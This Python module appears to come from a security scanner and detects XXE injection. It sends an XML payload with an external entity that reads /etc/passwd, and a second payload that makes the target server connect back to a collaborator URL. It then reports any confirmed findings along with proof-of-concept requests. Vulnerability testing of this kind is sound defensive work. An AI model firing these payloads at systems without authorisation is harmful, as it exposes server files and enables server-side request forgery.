"""XML External Entity (XXE) injection.

An endpoint that parses an XML body with external-entity resolution enabled lets
an attacker read local files or make the server issue outbound requests (SSRF).

Deterministic, zero-FP, confirmed three ways:
  - in-band file read : an external entity pointing at file:///etc/passwd is
    resolved and the passwd signature appears in the response;
  - out-of-band       : the entity points at our collaborator and the target
    connects back (was_hit);
  - in-band OOB marker : the collaborator's token-keyed body is reflected back.
"""
import re

PASSWD_RE = re.compile(r"root:.*:0:0:", re.M)
_XML_CTS = ["Content-Type: application/xml", "Content-Type: text/xml"]

_FILE_PAYLOAD = ('<?xml version="1.0" encoding="UTF-8"?>'
                 '<!DOCTYPE vapt [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                 '<vapt><x>&xxe;</x></vapt>')


def _oob_payload(cb):
    return ('<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE vapt [<!ENTITY xxe SYSTEM "{cb}">]>'
            '<vapt><x>&xxe;</x></vapt>')


def _f(title, sev, desc, steps, req, resp):
    return dict(title=title, vuln_class="hunt-xxe", severity=sev, confidence="confirmed",
                cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                description=desc, steps=steps, poc_request=req, poc_response=(resp or "")[:800])


def check_xxe(send, url, make_callback=None, was_hit=None):
    # 1) in-band local file read
    for ct in _XML_CTS:
        r = send("POST", url, headers=ct, body=_FILE_PAYLOAD)
        if r.get("ok") and PASSWD_RE.search(r.get("text") or ""):
            return [_f(
                "XML External Entity (XXE) — local file disclosure", "critical",
                f"{url} parses XML with external entities enabled: an entity pointing at "
                f"file:///etc/passwd was resolved and its contents appeared in the response.",
                f"POST {url} with an XML body declaring a SYSTEM entity for /etc/passwd.",
                f"POST {url}\n{ct}\n\n{_FILE_PAYLOAD}", r.get("text") or "")]
    # 2) out-of-band / marker reflection
    if make_callback and was_hit:
        token, cb = make_callback("xxe")
        r = send("POST", url, headers=_XML_CTS[0], body=_oob_payload(cb))
        inband = f"VAPTSSRFOK:{token}" in (r.get("text") or "")
        if was_hit(token) or inband:
            how = ("the collaborator body was reflected back (in-band)" if inband
                   else "the server connected back to our out-of-band collaborator")
            return [_f(
                "XML External Entity (XXE) — out-of-band", "high",
                f"{url} resolves external entities: an entity pointing at our canary caused {how}, "
                f"so the XML parser performs attacker-controlled outbound requests (SSRF) and can "
                f"read local resources.",
                f"POST {url} with an XML body declaring a SYSTEM entity for our canary URL.",
                f"POST {url}\n{_XML_CTS[0]}\n\n{_oob_payload(cb)}",
                f"token {token}")]
    return []
